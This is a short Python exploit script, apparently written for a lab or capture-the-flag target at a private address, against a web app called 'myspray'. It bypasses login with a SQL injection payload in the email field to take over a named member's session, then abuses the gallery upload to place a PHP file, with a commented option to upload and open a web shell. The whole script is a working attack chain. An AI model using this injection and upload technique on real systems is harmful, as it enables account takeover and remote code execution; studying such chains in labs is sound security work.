import requests

# This script uploads a simple "Hello world!" script to make demonstration easier, but you can use the commented line instead to upload
# the code from a shell to the server.
upload_file = "hello-world.php"
#upload_file = "shell.php"

url = "http://10.0.23.22/myspray/"

# Hanni Ball's session:
s = requests.Session()
r = s.post(url, data={"email":"a' UNION SELECT * FROM community_member WHERE first_name='Hanni' AND last_name='Ball'; #", "password":"a"})

session_id = s.cookies["sessionid"];

# Upload file using post. The 'data' field must not be empty for the server to run the upload routine.
r = s.post(url + "upload.html", data={"some_data":"some_data"}, files={"0":open(upload_file, "rb")})

# The file has been uploaded to the user's gallery and can be accessed like this. In order to run the actual shell, you can repeat the
# upload procedure with 'shell.php', then open this path (http://10.0.23.22/myspray/media/member/92/shell.php) via browser.
r = s.get(url + "media/member/" + session_id + "/" + upload_file)

# Print HTML response.
print(r.content)
